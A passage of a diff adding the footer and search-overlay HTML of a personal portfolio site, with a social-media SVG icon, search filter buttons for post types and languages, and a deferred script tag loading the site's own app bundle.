+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
